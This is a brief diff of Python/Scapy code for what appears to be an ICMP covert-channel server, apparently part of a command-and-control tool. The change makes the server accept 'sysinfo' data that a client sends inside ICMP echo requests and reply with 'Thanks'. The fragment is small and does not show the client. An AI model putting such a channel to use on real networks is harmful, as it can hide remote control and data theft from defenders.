@@ -48,8 +48,11 @@ def main(argv):
 					print "[*] Response sent: " + sys.argv[1]
 					#resp.show2()
 					send(resp)
-				elif request == 'sysinfo':
-					print "[*] Client sent sysinfo"
+				elif 'sysinfo' in request:
+					sysinfo = request[8:]
+					print "[*] Client sent sysinfo: %s" % sysinfo
+					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/"Thanks"
+					print "[*] Response sent: Thanks"	
 				else:	
 					print "[**] Client not recognized"
 			except KeyboardInterrupt:
